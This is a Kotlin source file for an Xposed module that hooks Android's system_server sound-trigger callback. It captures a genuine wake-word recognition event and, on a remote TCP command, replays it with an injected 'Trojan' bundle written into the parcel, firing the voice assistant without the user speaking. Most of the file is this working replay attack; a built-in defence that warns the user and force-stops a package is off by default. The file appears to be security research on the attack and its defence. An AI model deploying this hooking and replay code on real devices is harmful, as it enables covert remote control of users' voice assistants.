package xyz.mufanc.vap.hook

import android.os.SystemProperties
import android.media.soundtrigger_middleware.PhraseRecognitionEvent
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.Parcel
import android.system.Os
import io.github.libxposed.api.XposedInterface
import io.github.libxposed.api.XposedInterface.BeforeHookCallback
import io.github.libxposed.api.annotations.AfterInvocation
import io.github.libxposed.api.annotations.BeforeInvocation
import io.github.libxposed.api.annotations.XposedHooker
import org.joor.Reflect
import xyz.mufanc.vap.api.ClassHelper
import xyz.mufanc.vap.api.HookBase
import xyz.mufanc.vap.api.MethodFinder
import xyz.mufanc.vap.util.Log
import xyz.mufanc.vap.util.RemoteControl
import xyz.mufanc.vap.util.TombstoneObserver
import java.lang.reflect.Method
import java.util.WeakHashMap

class HookSystemServer(ixp: XposedInterface) : HookBase(ixp) {

    companion object {
        private const val TAG = "HookSystemServer"
    }

    @XposedHooker
    class WriteToParcelHook : XposedInterface.Hooker {
        companion object {

            private const val TAG = "WriteToParcelHook"

            private val extras = WeakHashMap<Any, Bundle>()

            fun mark(event: Any, extra: Bundle) {
                extras[event] = extra
            }

            @JvmStatic
            @AfterInvocation
            fun after(callback: XposedInterface.AfterHookCallback, ctx: WriteToParcelHook?) {
                extras[callback.thisObject]?.let { extra ->
                    (callback.args[0] as? Parcel)?.writeBundle(extra)
                    Log.i(TAG, "Trojan object written: ${callback.thisObject}")
                }
            }
        }
    }

    @XposedHooker
    class OnPhraseRecognitionHook : XposedInterface.Hooker {
        companion object {

            private const val TAG = "OnPhraseRecognitionHook"

            private var index: Int = -1

            private lateinit var func: Method
            private var ctx: Any? = null
            private lateinit var args: Array<Any?>
            
            // 保存原始的 callback 对象，用于触发后续的 Binder 调用
            private var savedCallback: Any? = null
            
            @Volatile
            private var isReplaying = false

            private fun isCallFromReplay(): Boolean {
                return isReplaying
            }

            fun replay(extra: Bundle) {
                Log.i(TAG, "REPLAY ATTACK - Injecting malicious bundle")
                val context = ctx ?: throw IllegalStateException("`this` object is not initialized or has been lost!")
                
                // 标记恶意 Bundle
                WriteToParcelHook.mark(args[index]!!, extra)
                val defenceEnabled = SystemProperties.getBoolean("debug.vap.defence.enable", false)
                Log.i(TAG, "Defence status: $defenceEnabled")
                
                // 设置重放标记
                isReplaying = true
                
                try {
                    // 执行重放攻击,触发完整的事件传递链
                    func.invoke(context, *args)
                    if (defenceEnabled) {
                        Log.i(TAG, "Replay blocked by defence system")
                    } else {
                        Log.i(TAG, "Replay attack executed - event sent to VoiceTrigger")
                    }
                } catch (err: Throwable) {
                    Log.e(TAG, "Replay attack failed", err)
                } finally {
                    isReplaying = false
                }
            }

            @JvmStatic
            @BeforeInvocation
            fun before(callback: BeforeHookCallback): OnPhraseRecognitionHook {
                if (index == -1) {
                    index = (callback.member as Method).parameterTypes.indexOf(PhraseRecognitionEvent::class.java)
                }

                val event = callback.args[index]
                val status: Int = Reflect.on(Reflect.on(event).get<Any>("common")).get("status")

                if (status == 0) {
                    if (!isCallFromReplay()) {
                        // 真实的硬件唤醒
                        Log.i(TAG, "Legitimate hardware trigger detected")
                        
                        // 保存上下文供重放使用
                        func = callback.member as Method
                        ctx = callback.thisObject
                        args = callback.args.clone()  // 克隆参数数组，避免被修改
                        savedCallback = callback.thisObject
                        
                        Log.i(TAG, "Context saved for future replay attacks")
                        Log.d(TAG, "Saved method: ${func.name}, context: ${ctx?.javaClass?.simpleName}")
                    } else {
                        // 重放攻击触发的调用
                        Log.i(TAG, "Replay attack in progress (from replay() function)")
                        
                        val defenceEnabled = SystemProperties.getBoolean("debug.vap.defence.enable", false)
                        if (defenceEnabled) {
                            Log.i(TAG, "")
                            Log.i(TAG, "DEFENCE ENABLED")
                            Log.i(TAG, "")
                            
                            // 记录攻击统计
                            try {
                                Log.i(TAG, "Recording attack statistics (blocked=true)...")
                                xyz.mufanc.vap.util.AttackStatistics.recordAttack(blocked = true)
                                Log.i(TAG, "Attack statistics recorded successfully")
                            } catch (e: Throwable) {
                                Log.e(TAG, "Failed to record attack statistics", e)
                            }
                            
                            // 执行防御
                            try {
                                Log.i(TAG, "Calling TextVerifier.warnUser()...")
                                xyz.mufanc.vap.util.TextVerifier.warnUser()
                                Log.i(TAG, "warnUser() completed")
                                
                                Log.i(TAG, "Calling TextVerifier.forceStopPackage()...")
                                xyz.mufanc.vap.util.TextVerifier.forceStopPackage()
                                Log.i(TAG, "forceStopPackage() completed")
                                Log.i(TAG, "REPLAY ATTACK BLOCKED SUCCESSFULLY")
                            } catch (e: Throwable) {
                                Log.e(TAG, "FAILED to block replay attack", e)
                            }
                            
                            // 发送 Signal 35 用于 tombstone 分析
                            Log.d(TAG, "Also triggering Signal 35 for tombstone analysis")
                            try {
                                val pid = android.os.Process.myPid()
                                val tid = Os.gettid()
                                Log.d(TAG, "Sending Signal 35: PID=$pid, TID=$tid, Thread=${Thread.currentThread().name}")
                                
                                Os.kill(tid, 35)
                                Log.d(TAG, "Signal 35 sent successfully")

                                Thread.sleep(500)
                            } catch (e: Throwable) {
                                Log.e(TAG, "Failed to send Signal 35", e)
                            }

                            Log.i(TAG, "Skipping original method execution to block attack chain")
                            callback.returnAndSkip(null)
                        } else {
                            Log.w(TAG, "Defence DISABLED - replay attack proceeding without blocking")
                            
                            // 记录未拦截的攻击
                            try {
                                Log.i(TAG, "Recording attack statistics (blocked=false)...")
                                xyz.mufanc.vap.util.AttackStatistics.recordAttack(blocked = false)
                                Log.i(TAG, "Attack statistics recorded successfully")
                            } catch (e: Throwable) {
                                Log.e(TAG, "Failed to record attack statistics", e)
                            }
                        }
                    }
                }
                return OnPhraseRecognitionHook()
            }
        }
    }

    init {
        Log.i(TAG, "HookSystemServer initializing...")
        
        try {
            val currentValue = Reflect.on(SystemProperties::class.java)
                .call("get", "debug.vap.defence.enable", "").get<String>()
            if (currentValue.isEmpty()) {
                Reflect.on(SystemProperties::class.java)
                    .call("set", "debug.vap.defence.enable", "0")
                Log.i(TAG, "Defence disabled by default (first run) - set to 1 to enable")
            } else {
                Log.i(TAG, "Defence status: $currentValue (0=disabled, 1=enabled)")
            }
        } catch (e: Throwable) {
            Log.w(TAG, "Failed to check/set property: ${e.message}")
        }
        
        try {
            MethodFinder(PhraseRecognitionEvent::class.java)
                .filter { name == "writeToParcel" }
                .first()
                .createHook(WriteToParcelHook::class.java)
            Log.i(TAG, "WriteToParcelHook installed successfully")
        } catch (err: Throwable) {
            Log.e(TAG, "Failed to install WriteToParcelHook", err)
        }

        try {
            val callbackClass = ClassHelper.findClass(Constants.SoundTriggerValidation_Callback_Wrapper)
            Log.i(TAG, "Found callback class: ${callbackClass.name}")
            MethodFinder(callbackClass)
                .filter { name == "onPhraseRecognition" }
                .first()
                .createHook(OnPhraseRecognitionHook::class.java)
            Log.i(TAG, "OnPhraseRecognitionHook installed successfully")
        } catch (err: Throwable) {
            Log.e(TAG, "Failed to install OnPhraseRecognitionHook - class not found", err)
            Log.w(TAG, "Expected class: ${Constants.SoundTriggerValidation_Callback_Wrapper}")
            Log.w(TAG, "This MIUI version may use a different class name. Attack chain will not work.")
        }

        val rc = RemoteControl.init()
        rc.on("command") { args ->
            Log.i(TAG, "TCP Command received: $args")
            try {
                OnPhraseRecognitionHook.replay(args)
            } catch (err: Throwable) {
                Log.e(TAG, "failed to replay", err)
            }
        }

        Log.i(TAG, "Posting TombstoneObserver.install() to main looper")
        Handler(Looper.getMainLooper()).post {
            Log.i(TAG, "Main looper handler executed, calling TombstoneObserver.install()")
            try {
                TombstoneObserver.install()
                Log.i(TAG, "TombstoneObserver.install() returned successfully")
            } catch (e: Throwable) {
                Log.e(TAG, "TombstoneObserver.install() FAILED", e)
            }
        }
        Log.i(TAG, "HookSystemServer initialization completed")
    }
}
